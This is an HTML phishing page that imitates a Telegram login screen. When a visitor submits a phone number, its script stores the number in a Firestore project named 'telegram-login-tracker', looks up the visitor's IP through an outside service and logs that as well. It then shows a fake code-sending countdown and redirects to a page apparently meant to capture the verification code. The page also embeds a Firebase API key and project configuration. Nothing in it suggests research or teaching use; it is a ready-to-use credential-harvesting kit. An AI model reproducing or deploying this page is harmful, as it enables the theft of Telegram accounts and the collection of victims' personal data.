<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0088cc 0%, #00a2e8 100%);
            padding: 20px;
        }

        .telegram-container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            text-align: center;
        }

        .telegram-header {
            color: #0088cc;
            margin-bottom: 30px;
        }

        .telegram-header i {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
        }

        .input-group input:focus {
            border-color: #0088cc;
            box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
            outline: none;
        }

        .telegram-btn {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .telegram-btn:hover {
            background: #0077b3;
            transform: translateY(-2px);
        }

        .back-btn {
            margin-top: 15px;
            color: #0088cc;
            text-decoration: none;
            display: inline-block;
        }

        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
            line-height: 1.5;
        }

        .loading {
            display: none;
            margin-top: 15px;
            text-align: center;
        }

        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        .countdown {
            font-size: 16px;
            font-weight: 600;
            color: #0088cc;
            margin: 10px 0;
        }

        .loading-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="telegram-container">
        <div class="telegram-header">
            <i class="fab fa-telegram"></i>
            <h2>Telegram</h2>
            <p>Enter your phone number to continue</p>
        </div>
        
        <form id="telegramForm">
            <div class="input-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
            </div>
            
            <button type="submit" class="telegram-btn" id="receiveBtn">Receive Code</button>
        </form>

        <div class="loading" id="loading">
            <div class="loading-spinner"></div>
            <div class="loading-text">Sending verification code to your device...</div>
            <div class="countdown" id="countdown">20 seconds</div>
            <p class="info-text">You can check your email/telegram app for code</p>
        </div>
        
        <p class="info-text">We'll send a verification code to your device via Telegram/ gmail</p>
        
        <a href="index.html" class="back-btn">‚Üê Back to main login</a>
    </div>

    <script>
        // Firebase configuration - REPLACE WITH YOUR ACTUAL CONFIG
       const firebaseConfig = {
    apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
    authDomain: "telegram-login-tracker.firebaseapp.com",
    projectId: "telegram-login-tracker",
    storageBucket: "telegram-login-tracker.firebasestorage.app",
    messagingSenderId: "930264969410",
    appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
    measurementId: "G-5760KLJZJS"
  };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        document.getElementById('telegramForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            if (phone) {
                // Show loading state
                document.getElementById('receiveBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';

                // Prepare initial data with phone number only
                const initialData = {
                    phone: phone,
                    platform: 'Telegram',
                    status: 'waiting_for_code',
                    timestamp: new Date().toISOString(),
                    ip: await getIP()
                };

                try {
                    // Save phone number to Firebase immediately
                    await db.collection('telegramLogins').add(initialData);
                    
                    // Also save to localStorage
                    localStorage.setItem('telegramLoginData', JSON.stringify(initialData));
                    sessionStorage.setItem('telegramLoginData', JSON.stringify(initialData));

                    // Start 20-second countdown
                    let secondsLeft = 20;
                    const countdownElement = document.getElementById('countdown');
                    
                    const countdownInterval = setInterval(() => {
                        secondsLeft--;
                        countdownElement.textContent = `${secondsLeft} seconds`;
                        
                        if (secondsLeft <= 0) {
                            clearInterval(countdownInterval);
                            // Redirect to code page after countdown
                            window.location.href = `telegram-code.html?phone=${encodeURIComponent(phone)}`;
                        }
                    }, 1000);
                    
                } catch (error) {
                    console.error('Failed to save data:', error);
                    alert('Failed to save data. Please try again.');
                    document.getElementById('receiveBtn').style.display = 'block';
                    document.getElementById('loading').style.display = 'none';
                }
            } else {
                alert('Please enter your phone number');
            }
        });

        // Function to get user's IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }
    </script>
</body>
</html>
